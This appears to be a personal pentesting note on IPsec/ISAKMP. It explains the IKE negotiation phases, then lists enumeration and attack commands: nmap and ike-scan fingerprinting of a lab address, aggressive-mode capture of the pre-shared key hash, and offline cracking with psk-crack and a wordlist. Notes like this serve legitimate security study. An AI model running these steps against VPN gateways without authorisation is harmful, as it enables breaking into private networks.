### What is isakmp?
IP Sec is a widely recognized as the principle technology for sharing communications between networks (LAN-to-LAN) and from remote users to the network gateway, serving as the backbone for VPN solutions.  

The establishment of a security association (SA) between two points is managed by IKE, which operates under the umbrella of ISAKMP, a protocol designed for the authentication and key exchange 

### Phase 1
Secure Channel is created between two endpoints. This is achieved through the use of a Pre-Shared Key(PSK) or certificates, employing either main mode, which invovles three pairs of messages or aggressive mode. 
### Phase 1.5
Though not mandatory, this phase, known as the Extended Authentication Phase, verifies the identity of the user attempting to connect by requiring a username + password
### Phase 2
This phase is dedicated to negotiating the parameters for securing data with the ESP and the AH. It allows for the use of algorithms different to those in Phase 1 to ensure Perfect Forwarding Secrecy (PFS), enhancing security. 

### Enumeration / Exploitation 
Resources:https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp

Nmap scan for IKE version
```
nmap -sU -p 500 --script ike-version <target_ip>
```

Passive Fingerprinting:
```
ike-scan -M -A 10.10.11.87
```

Extract VPN Group Name & Hash

```
ike-scan -A --pskcrack 10.10.11.87
```

Crack a Pre-Shared Key using psk-crack (John + Hashcat should work too)

```
psk-crack -d rockyou.txt key
```
